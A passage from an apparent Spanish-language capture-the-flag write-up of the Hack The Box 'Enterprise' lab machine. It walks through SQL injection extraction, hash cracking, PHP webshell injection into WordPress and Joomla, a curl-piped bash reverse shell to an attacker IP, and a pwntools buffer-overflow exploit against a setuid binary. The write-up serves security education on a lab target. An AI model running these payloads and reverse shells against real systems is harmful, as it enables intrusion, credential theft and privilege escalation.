    payload = "(SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x45,(SELECT MID((IFNULL(CAST(%s AS NCHAR),0x20)),1,80) FROM %s.%s " % (column_name, db_name, table_name)
    payload += "LIMIT %d,1),0x54,FLOOR(RAND(0)*2))x " % (table_position)
    payload += "FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)nada)"
...
```

```bash
❭ python3 ex_information.py wp_users user_login
[+] Info columna user_login - tabla wp_users: d0Ne
[+] Payload: d0Ne
------------------------------------------·
[+] [0]: william.riker

k3Ep br3ak1n6 4anYyyu...

```

```bash
❭ python3 ex_information.py wp_users user_pass
[+] Info columna user_pass - tabla wp_users: d0Ne
[+] Payload: d0Ne
------------------------------------------·
[+] [0]: $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.

k3Ep br3ak1n6 4anYyyu...

```

Solo hay un registro, el usuario `william.riker` (que habíamos descubierto antes) y la contraseña encriptada `$P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.`...

Perfecto, pues antes de seguir con las demás bases de datos, intentemos crackear ese hash, lo guardamos en un archivo y ejecutamos **john** o **hashcat**:

* [Example hashes - Wiki Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes).

```bash
❭ john --wordlist=/usr/share/wordlists/rockyou.txt william_hash 
```

Pero se queda un bueeeeeen rato intentando crackear el hash, hasta llegar al final del archivo e indicarnos que no ha sido crackeado :( Entonces sigamos profundizando entre las otras bases de datos.

...

**Creamos un script (completo y con varios cambios) que contenga todas las extracciones, asi es muuuucho más fácil de movernos entre bases de datos, tablas y columnas ;P**

> [ex_all.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/ex_all.py)

...

Veamos la base de datos **joomla**:

```bash
❭ python3 ex_all.py joomla
[+] Extrayendo tablas de la base de datos joomla: d0Ne
[+] Payload: d0Ne
------------------------------------------·

```

Está vacía, juguemos entonces con la base de datos **joomladb** (que si revisamos nuestro escaneo de `nmap`, nos indicaba que el puerto **8080** está sirviendo un CMS **Joomla**):

```bash
❭ python3 ex_all.py joomladb  
[+] Extrayendo tablas de la base de datos joomladb: d0Ne
[+] Payload: d0Ne
------------------------------------------·  
[+] Tabla [0]: edz2g_assets                  
...
...
...
[+] Tabla [69]: edz2g_users
[+] Tabla [70]: edz2g_utf8_conversion
[+] Tabla [71]: edz2g_viewlevels
```

Bien, enumeremos la tabla `edz2g_users`:

```bash
❭ python3 ex_all.py joomladb edz2g_users
[+] Extrayendo columnas de la tabla edz2g_users: d0Ne
[+] Payload: d0Ne
------------------------------------------·
[+] Columna [0]: id
[+] Columna [1]: name
[+] Columna [2]: username
[+] Columna [3]: email
[+] Columna [4]: password
[+] Columna [5]: block
[+] Columna [6]: sendEmail
[+] Columna [7]: registerDate
[+] Columna [8]: lastvisitDate
[+] Columna [9]: activation
[+] Columna [10]: params
[+] Columna [11]: lastReset
[+] Columna [12]: resetCount
[+] Columna [13]: otpKey
[+] Columna [14]: otep
[+] Columna [15]: requireReset
```

Veamos la data de los campos `username` y `password`:

```bash
❭ python3 ex_all.py joomladb edz2g_users username
[+] Info columna username - tabla edz2g_users: d0Ne
[+] Payload: d0Ne
------------------------------------------·
[+] [0]: geordi.la.forge
[+] [1]: Guinan

k3Ep br3ak1n6 4anYyyu...

```

```bash
❭ python3 ex_all.py joomladb edz2g_users password
[+] Info columna password - tabla edz2g_users: d0Ne
[+] Payload: d0Ne
------------------------------------------·
[+] [0]: $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy
[+] [1]: $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q

k3Ep br3ak1n6 4anYyyu...

```

Opa 2 usuarios con credenciales:

```bash
* geordi.la.forge:$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy.
* Guinan:$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q.
```

Bien, pues volvamos a intentar crackear, pero ahora estos hashes:

```bash
❭ strings joomla_hashes 
$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy
$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q
```

Para cambiar, usemos [hashcat](https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/):

```bash
❭ hashcat -m 3200 -a 0 -o cracked.txt joomla_hashes /usr/share/wordlists/rockyou.txt
...
```

* `-m`: Le indicamos el tipo de hash, **3200** hace referencia a **bcrypt**.
* `-a`: Con **0**, le decimos que el ataque es tipo diccionario.
* `-o`: El resultado crackeado nos lo guarda en el archivo `craced.txt`.
* Pasamos archivo de hashes.
* Pasamos diccionario a usar.

> Unlike the other hash algorithms we’ve encountered so far bcrypt is specifically designed to be slow to crack, especially for GPUs. [Crack The Hash - TryHackMe](https://unicornsec.com/home/tryhackme-crack-the-hash).

Y sí, es demasiado demorado (18 días 😱 +-), dejémoslo un rato y mientras tanto enumeremos el puerto **8080**.

...

### Puerto 8080 [⌖](#puerto-8080) {#puerto-8080}

![112page8080](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080.png)

Bien, una página web normal, con algunas referencias extrañas, también al final vemos un panel login, pero no podemos hacer mucho con él a pesar de tener usuarios válidos (presuntamente), ya que no tenemos contraseñas aún...

Profundizando (y de nuevo, recordando el escaneo con **nmap**), vemos que está siendo soportada por el gestor de contenido (CMS) **Joomla**, que básicamente es una herramienta para la creación de sitios web. 

> [¿Qué es Joomla?](https://www.webempresa.com/joomla.html).

Enumerando también nos damos cuenta de que tiene disponible el recurso `robots.txt`:

![112page8080_robotsTXT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_robotsTXT.png)

Bien, varios apartados, veamos `administrator/`:

![112page8080_administratorPANEL](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_administratorPANEL.png)

Otro panel de logeo, pero igual, jugando no logramos nada :(

A este punto habían pasado varios minutos y nada con respecto al crackeo, asi que cancelándolo y probando otras cositas como estas (e.e) obtenemos:

* Crear un diccionario basado en el contenido de las webs: `curl` > `html2text` > `hashcat/john`. Nada, seguimos sin resultados.
* Tomar el anterior diccionario, pero ahora agregarle **reglas**, les dejo un post donde las explican. Pero después de jugar seguimos igual :(
  * [Dictionary attack with rules - Hashcat](https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/).
  * (Mejor dos recursos, este está buenísimo) [One Rule to Rule Them All](https://notsosecure.com/one-rule-to-rule-them-all/).

* Tomar los nombres de los usuarios (como son medio extraños) crear un diccionario que los contenga y volver a jugar con las reglas... Nada :(

Otras cositas que intentamos, pero contra la web fueron:

* Fuzzear entre algunos de los directorios anteriores, pero no encontramos nada interesante.
* Buscar de alguna forma la versión del **Joomla**, [acá encontramos](https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website) que en la ruta `administrator/manifests/files/joomla.xml` se puede visualizar, y si:

![112page8080_administratorVERSION](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_administratorVERSION.png)

Buscando las vulnerabilidades relacionadas vemos algunas, pero no obtenemos nada de ellas :(

...

Después de un rato jugando con las bases de datos y sus tablas, encontramos esto en la tabla `wp_posts` (donde están los posts del sitio):

```bash
❭ python3 ex_all.py wordpress
[+] Extrayendo tablas de la base de datos wordpress: d0Ne
[+] Payload: d0Ne

...
[+] Tabla [5]: wp_posts
...
```

```bash
❭ python3 ex_all.py wordpress wp_posts
[+] Extrayendo columnas de la tabla wp_posts: d0Ne
[+] Payload: d0Ne

...
[+] Columna [4]: post_content
[+] Columna [5]: post_title
...
```

```bash
❭ python3 ex_all.py wordpress wp_posts post_status
[+] Info columna post_title - tabla wp_posts: d0Ne
[+] Payload: d0Ne

...
[+] [34]: Stardate 55132.2
[+] [35]: Passwords 
[+] [36]: Passwords
[+] [37]: Passwords
[+] [38]: YAYAYAYAY.
...
```

Vemos 2 posts conocidos, pero 3 con un nombre bastante llamativo y que no vimos en nuestro reconocimiento web... Enfoquémonos en las filas 35, 36 y 37. Echemos un ojo a su contenido:

```bash
❭ python3 ex_all.py wordpress wp_posts post_content
[+] Info columna post_content - tabla wp_posts: d0Ne
[+] Payload: d0Ne

...
[+] [35]: Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6 &amp;nbsp; &amp;nbsp;
[+] [36]: Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 u*Z14ru0p#ttj83zS6 &amp;nbsp; &amp;nbsp;
[+] [37]: Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6 &amp;nbsp; &amp;nbsp;
...
```

What jjaja, que loco esto, en el lugar menos pensado vemos lo que parecen ser unas contraseñas (y el post lo dice tambien :P):

```bash
* ZxJyhGem4k338S2Y
* enterprisencc170
* ZD3YxfnSjezg67JZ
* u*Z14ru0p#ttj83zS6
```

Jmm, pues viendo quien creo esos posts (columna `post_author`) obtenemos el ID **1**, si vemos la tabla `wp_users` y jugamos con el campo **ID** y **user_login**, vemos que el **ID:1** hace referencia a **william.riker**, asi que él fue el que puso esas contraseñas en el post, por lo que probablemente alguna de ellas nos sirva para entrar con su cuenta en el panel login de **WordPress**, validemos:

...

#### WordPress login done

![112page80_wpAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin.png)

Probando con `william.riker:u*Z14ru0p#ttj83zS6` logramos entrar :)

![112page80_wpAdmin_dash](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin_dash.png)

Perfectoooo, tamos dentro :')

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112birDance.gif" style="display: block; margin-left: auto; margin-right: auto; width: 30%;"/>

Bastante camino para llegar acá :) Ahora es muy simple es entablarnos una reverse Shell, simplemente debemos modificar algunos de los plugins que existan en el sitio, como ya jugamos con el plugin **lcars**, sabemos que existe.

Vamos a **Plugins** > **Editor**:

![112page80_wpAdmin_plugins](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin_plugins.png)

Seleccionamos ahora el plugin **lcars** (donde esta la flecha 😜) y damos clic en **Select**:

![112page80_wpAdmin_plugins_lcars](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin_plugins_lcars.png)

Perfecto, vemos los 3 archivos con los que ya jugamos y su contenido, solo que ahroa tenemos la posibilidad de editarlos, validemos que usuario esta ejecutando el servicio web, usare `lcars.php`:

```php
...
// need to make it secure

system("whoami");

?>
```

Clic en **Update File**, obtenemos **File edited successfully.** y vamos al archivo en la web:

```bash
❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars.php
www-data
```

Listo, confirmamos ejecucion remota de comandos, ahora creemonos un archivo que contenga lo que queremos que ejecute el sistema, asi se nos hace más facil movernos entre comandos sin tener que modificar el plugin cada vez:

```bash
❭ cat rev.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.17/4433 0>&1
```

Levantamos un servidor web con **Python**: 

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y nos ponemos en escucha con **netcat** en el puerto **4433**: `nc -lvp 4433`. 

Finalmente editamos el plugin:

```php
...
// need to make it secure

// Leera el contenido del archivo rev.sh y con "| bash" lo interpretara.
system("curl http://10.10.14.17:8000/rev.sh | bash");

?>
```

Simplemente hacemos una petición hacia el archivo y obtenemos nuestra reverse Shell:

![112bash_wwwdata_RevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_wwwdata_RevSH.png)

Hagamos tratamiento de la TTY para asi poder hacer `CTRL+C` sin miedo a perder la terminal, además de poder movernos entre comandos y tener historial :)

* [**S4vitar** explica en este video como obtener una Shell completamente interactiva (tratamiento TTY)](https://www.youtube.com/watch?v=7L1WNU7fBec&t=5004s).

Listooooos, a enumerar...

...

### Reverse Shell www-data WordPress

En el directorio `/var/www/html` tenemos los objetos de **WordPress**, validando el contenido del archivo `wp-config.php` (el que hace la conexión con la base de datos), obtenemos las credenciales del usuario **root**, pero de la base de datos, ya jugamos con la base de datos asi que no es interesante, pero las credenciales si lo son, guardémoslas por si algo :)

```php
...
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'NCC-1701E');
...
```

Dando vueltas nos encontramos este archivo en el direcotorio `home/`:

```bash
www-data@b8319d86d21e:/home$ cat user.txt 
As you take a look around at your surroundings you realise there is something wrong.
This is not the Enterprise!
As you try to interact with a console it dawns on you.
Your in the Holodeck!
```

Básicamente que estamos en otro sitio y debemos movernos :(

En la raíz del sistema tenemos el archivo `.dockerenv`, el cual nos avisa que probablemente estemos en un contenedor (el hostname que tenemos también nos da una pista sobre ello). Si vemos el objeto `/etc/hosts` lo confirmamos y nos damos cuenta de algo:

```bash
www-data@b8319d86d21e:/$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      mysql 15af95635b7d
172.17.0.4      b8319d86d21e
```

Nosotros estamos en el host `b8319d86d21e` que resuelve a la **IP** `172.17.0.4`. Vemos también el host del servicio **MySQL**, pero hay una brecha, ya que falta la `172.17.0.3`. En este momento recordé el servicio **Joomla** y que tenemos credenciales para probar...

...

#### Joomla login done

Vamos al apartado `administrator/`:

![112page8080_administratorPANEL](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_administratorPANEL.png)

Y con las credenciales **geordi.la.forge:ZD3YxfnSjezg67JZ** logramos entrar al sitio como usuario **Super Users**:

![112page8080_administratorPANEL_dash](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_administratorPANEL_dash.png)

...

### Reverse Shell www-data Joomla

Listoneeeees, jugando con [este recurso](https://www.hackingarticles.in/joomla-reverse-shell/) obtenemos ejecución remota de comandos, simplemente debemos modificar un template (modificaré el archivo `index.php` del template **beez3**) y dirigirnos a el para que el código sea ejecutado...

Usamos el mismo payload de antes (`curl` a nuestro servidor) solo que ahora cambiamos el puerto por el cual obtendremos la Reverse Shell:

```php
...
system("/usr/bin/curl http://10.10.14.17:8000/rev.sh | bash");
...
```

Hacemos una peticion hacia la ruta: `http://10.10.10.61:8080/templates/beez3/index.php` y obtenemos:

![112bash_wwwdata_joomla_RevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_wwwdata_joomla_RevSH.png)

Bien. Estamos en otro host, el `a7018bfdc454`. 

...

## Movimiento lateral : www-data (docker) -> www-data (host) [#](#movimiento-lateral-wwwdata-doc-host) {#movimiento-lateral-wwwdata-doc-host}

Después de hacer tratamiento de la TTY, encontramos esta maravilla:

```bash
www-data@a7018bfdc454:/var/www/html$ ls -la
total 16988
drwxr-xr-x 18 www-data www-data    4096 Sep  8  2017 .
drwxr-xr-x  4 root     root        4096 Jul 24  2017 ..
...
drwxrwxrwx  2 root     root        4096 Oct 17  2017 files
...
```

```bash
www-data@a7018bfdc454:/var/www/html/files$ ls -la
total 12
drwxrwxrwx  2 root     root     4096 Oct 17  2017 .
drwxr-xr-x 18 www-data www-data 4096 Sep  8  2017 ..
-rw-r--r--  1 root     root     1406 Oct 17  2017 lcars.zip
www-data@a7018bfdc454:/var/www/html/files$
```

Si recordamos, ya habíamos visto este archivo en nuestra enumeración con el puerto **443** de la máquina, asi que probablemente sea un recurso compartido, para validar creemos un archivo sencillito:

```bash
www-data@a7018bfdc454:/var/www/html/files$ echo "hola" > hola.txt
www-data@a7018bfdc454:/var/www/html/files$ ls -la
total 16
drwxrwxrwx  2 root     root     4096 May  7 21:38 .
drwxr-xr-x 18 www-data www-data 4096 Sep  8  2017 ..
-rw-r--r--  1 www-data www-data    5 May  7 21:38 hola.txt
-rw-r--r--  1 root     root     1406 Oct 17  2017 lcars.zip
www-data@a7018bfdc454:/var/www/html/files$
```

Y en la web:

![112page443_files_new_hola](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page443_files_new_hola.png)

```bash
❭ curl -s -k https://10.10.10.61/files/hola.txt
hola
```

Perrrrrrfecto, asi que podemos crearnos un archivo `.php` con contenido malicioso para que sea interpretado por la web :) Y ver a donde nos lleva...

```bash
www-data@a7018bfdc454:/var/www/html/files$ echo '<?php system("whoami; hostname"); ?>' > hola.php
```

```bash
❭ curl -s -k https://10.10.10.61/files/hola.php
www-data
enterprise.htb
```

Al parecer ahora si estamos comunicándonos con el **host**, entablémonos una nueva Reverse Shell :)

```bash
www-data@a7018bfdc454:/var/www/html/files$ echo '<?php system("curl http://10.10.14.17:8000/rev.sh | bash"); ?>' > hola.php
```

Cambiamos el puerto en el que vamos a estar escuchando:

```bash
❭ cat rev.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.17/4435 0>&1
```

Nos ponemos en escucha: `nc -lvp 4435` y hacemos la petición hacia el recurso, obtenemos:

![112bash_wwwdata_enterpriseHTB_RevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_wwwdata_enterpriseHTB_RevSH.png)

Tratamiento de la TTY y a enumerar.

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Con **www-data** tenemos acceso a la flag `user.txt` sobre la ruta `/home/jeanlucpicard`.

Viendo los servicios corriendo internamente tenemos:

```bash
www-data@enterprise:/$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State  
tcp        0      0 0.0.0.0:hostmon         0.0.0.0:*               LISTEN 
tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN 
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN 
...
```

Los dos puertos que vimos externamente, **22** y **32812**. Pero también uno llamado **hostmon**, que jugando con el archivo `/proc/net/tcp` (y con internet), vemos que es el puerto **5355**. Dando vueltas con él no conseguimos nada, asi que recordamos el puerto **32812** que (no se vio, pero se hizo :P) externamente nos mostraba un programa interactivo, veámoslo pero internamente:

```bash
www-data@enterprise:/$ nc 127.0.0.1 32812

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 
hola

Invalid Code
Terminating Console

www-data@enterprise:/$
```

**(Desde nuestra máquina atacante podemos ejecutar `nc 10.10.10.61 32812` y vamos a obtener el mismo output)**

Vale, es un programa relacionado con el plugin que ya explotamos, **lcars** (Library Computer Access and Retrieval System), nos pide un código de acceso... Intentando con las contraseñas que encontramos no logramos entrar :(

Se me dio la idea de buscar algo relacionado con **lcars** en la máquina, y sí, encontramos cositas:

```bash
www-data@enterprise:/$ find / -name lcars 2>/dev/null
/etc/xinetd.d/lcars
/bin/lcars
```

Un binario llamativo, profundicemos en él:

```bash
www-data@enterprise:/$ ls -la /bin/lcars 
-rwsr-xr-x 1 root root 12152 Sep  8  2017 /bin/lcars
www-data@enterprise:/$ file /bin/lcars 
/bin/lcars: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=88410652745b0a94421ce22ea4278a8eaea8db57, not stripped
```

```bash
www-data@enterprise:/$ /bin/lcars 

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 
hola

Invalid Code
Terminating Console

www-data@enterprise:/$ 
```

Tiene la misma ejecución, por lo tanto podemos pensar que el binario está siendo servido en el puerto **32812**, bien, juguemos con él...

Con [strace y ltrace](https://www.thegeekdiary.com/how-to-use-strace-and-ltrace-commands-in-linux/), podemos ver los llamados que hace una aplicación hacia el sistema, nos damos cuenta de algo:

```bash
www-data@enterprise:/$ ltrace /bin/lcars 
__libc_start_main(0x56555c91, 1, 0xffffdd04, 0x56555d30 <unfinished ...>
setresuid(0, 0, 0, 0x56555ca8)                                                                                         = 0xffffffff
puts(""
)                                                                                                               = 1
puts("                 _______ _______"...                 _______ _______  ______ _______
)                                                                            = 49
puts("          |      |       |_____|"...          |      |       |_____| |_____/ |______
)                                                                            = 49
puts("          |_____ |_____  |     |"...          |_____ |_____  |     | |    \_ ______|
)                                                                            = 49
puts(""
)                                                                                                               = 1
puts("Welcome to the Library Computer "...Welcome to the Library Computer Access and Retrieval System

)                                                                            = 61
puts("Enter Bridge Access Code: "Enter Bridge Access Code: 
)                                                                                     = 27
fflush(0xf7fc7d60)                                                                                                     = 0
fgets(
```

Ahí espera por nuestro input, coloquemos **hola**:

```bash
fgets(hola
"hola\n", 9, 0xf7fc75a0)                                                                                         = 0xffffdc47
strcmp("hola\n", "picarda1")                                                                                           = -1
puts("\nInvalid Code\nTerminating Consol"...
Invalid Code
Terminating Console

)                                                                          = 35
fflush(0xf7fc7d60)                                                                                                     = 0
exit(0 <no return ...>
+++ exited (status 0) +++
www-data@enterprise:/$
```

Opa, vemos la función [strcmp](https://www.cplusplus.com/reference/cstring/strcmp/) (que compara dos valores, si son iguales continua el flujo del programa), toma **hola** y lo compara con el valor **picarda1**, como no son iguales obtenemos el error **Invalid Code - Terminating Console**. Asi que probemos ejecutar el programa pero pasándole como código **picarda1**:

```bash
www-data@enterprise:/$ /bin/lcars 

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 
picarda1

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

LCARS Bridge Secondary Controls -- Main Menu: 

1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input: 

```

Perfecto, entramos, ahora nos encontramos un menú, jugando sin explotar nada, no vemos nada e.e Si generamos una cadena de 300 caracteres y se la pasamos a cada opción, obtenemos un [Segmentation Fault](https://en.wikipedia.org/wiki/Segmentation_fault) en `4. Security`:

```bash
❭ cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
```

```bash
...
LCARS Bridge Secondary Controls -- Main Menu: 

1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input: 
4
Disable Security Force Fields
Enter Security Override:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
Segmentation fault (core dumped)
www-data@enterprise:/$ 
```

Ooo, asi que probablemente debamos explotar este [buffer overflow](https://www.welivesecurity.com/la-es/2014/11/05/como-funcionan-buffer-overflow/) para ejecutar algún tipo de **Shell code** ante la máquina, ya profundizaremos en esto... Pasemos el binario a nuestro sistema atacante, asi es más fácil jugar.

* [Explicación sobre que es un buffer overflow](https://revista.seguridad.unam.mx/numero23/uno-de-los-cl-sicos-buffer-overflow).

```bash
www-data@enterprise:/bin$ python3 -m http.server 44444
Serving HTTP on 0.0.0.0 port 44444 ...
```

```bash
❭ wget http://10.10.10.61:44444/lcars
--2021-05-07 22:29:05--  http://10.10.10.61:44444/lcars
Conectando con 10.10.10.61:44444... conectado.
...
```

Validamos integridad del binario:

```bash
www-data@enterprise:/bin$ md5sum lcars 
cf72dd251d6fee25e638e9b8be1f8dd3  lcars
```

```bash
❭ md5sum lcars
cf72dd251d6fee25e638e9b8be1f8dd3  lcars
```

Listo, todo correcto, a divertirnos (:

...

### Buffer Overflow

Nos copiaremos la estructura de un programa que le vi a [dplastico](https://www.youtube.com/user/dplastico) para jugar con **gdb**, con el recurso remoto y también para movernos localmente.

Inicialmente le enviaremos todos los datos que recibe el programa:

```py
#!/usr/bin/python3

import sys
from pwn import *

elf = context.binary = ELF(sys.argv[1])
context.terminal = ['tmux', 'splitw', '-h']

def start():
    if args.GDB:
        return gdb.debug(sys.argv[1])
    if args.REMOTE:
        return remote('10.10.10.61', 32182)
    else:
        return process(sys.argv[1])

r = start()
# ======================= Aca ta la magia ========================

r.sendlineafter("Enter Bridge Access Code:", "picarda1")
r.sendlineafter("Waiting for input:", "4")
print(r.recv())

# ===================== Aca termina la magia ====================
r.interactive()
```

Ejecutamos:

```bash
❭ python3 exploit.py ./lcars
[*] '/htb/enterprise/scripts/lcars'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Starting local process './lcars': pid 898435
b' \n'
[*] Switching to interactive mode
Disable Security Force Fields
Enter Security Override:
$
```

Bien, el programa esta esperando el input donde encontramos el **Segmentation Fault**, por lo tanto sera donde enviaremos nuestro payload:

```py
#!/usr/bin/python3

import sys
from pwn import *

elf = context.binary = ELF(sys.argv[1])
context.terminal = ['tmux', 'splitw', '-h']

def start():
    if args.GDB:
        return gdb.debug(sys.argv[1])
    if args.REMOTE:
        return remote('10.10.10.61', 32812)
    else:
        return process(sys.argv[1])

r = start()
# ======================= Aca ta la magia ========================

payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac"

r.sendlineafter("Enter Bridge Access Code:", "picarda1")
r.sendlineafter("Waiting for input:", "4")
r.sendlineafter("Enter Security Override:", payload)

# ===================== Aca termina la magia ====================
r.interactive()
```

* [Writing exploits with **pwntools**](https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html).

**(Ya hablaremos de las protecciones del binario)**

Ejecutemos pero veamos el debug con **gdb** de una vez:

```bash
❭ python3 exploit.py ./lcars GDB
[*] '/sec/htb/enterprise/scripts/lcars'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Starting local process '/usr/bin/gdbserver': pid 907075
[*] running in new terminal: /usr/bin/gdb -q  "./lcars" -x /tmp/pwn4qa4544z.gdb
```

Y con **tmux** se nos abre otro panel en la misma ventana ejecutando **gdb**, escribimos `continue` (o `c`) y obtenemos:

![112bash_gdb_segFault](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_gdb_segFault.png)

Nos enfocaremos en el apartado **REGISTERS** y en uno de ellos por ahora:

* Registro `eip`, encargado de mostrar la siguiente dirección a la que ira el programa.

> [Información sobre los registros](https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm)

En nuestro caso 4 registros están siendo sobreescritos por parte de nuestro payload, la idea es extraer exactamente la posición del paylaod que contiene el registro **eip**, ya que si es el registro que indica a donde ir, teniendo control sobre él, podríamos poner cualquier dirección a la cual queramos que vaya, esto lo podemos hacer con el mismo **cyclic**:

```bash
...
# *EIP  0x63616164 ('daac')
...
pwndbg> cyclic -l daac
212
```

En la posición 212 encuentra los caracteres **daac**, pues generemos **212** A's **4** B's y **4** C's para mostrar mejor esto y enviémoslas ;)

```py
...
payload = "A"*212·                                                                                                                                                                         payload += "B"*4 + "C"*4
...
```

```bash
...
*EAX  0xfe
*EBX  0x41414141 ('AAAA')
 ECX  0x0
 EDX  0x0
*EDI  0xf7f20000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e4d6c */
*ESI  0xf7f20000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e4d6c */
*EBP  0x41414141 ('AAAA')
*ESP  0xffdffc70 ◂— 'CCCC'
*EIP  0x42424242 ('BBBB')
...
```

Bien, tenemos que el registro que apunta a la base de la pila ([ebp](https://es.stackoverflow.com/questions/39686/en-que-se-usan-los-registros-ebp-edi-esi#answer-40119), "este registro mantiene la dirección del origen de la pila"), contiene hasta la posición **212**, despues empezaría el registro **eip** (que es el que nos interesa), conteniendo las **B**'s, por lo tanto en esa posición debe ir la dirección a la que queremos ir... Y las **C** estarían haciendo parte del stack, que es donde iría nuestro shellcode.

...

También podemos entenderlo asi: 

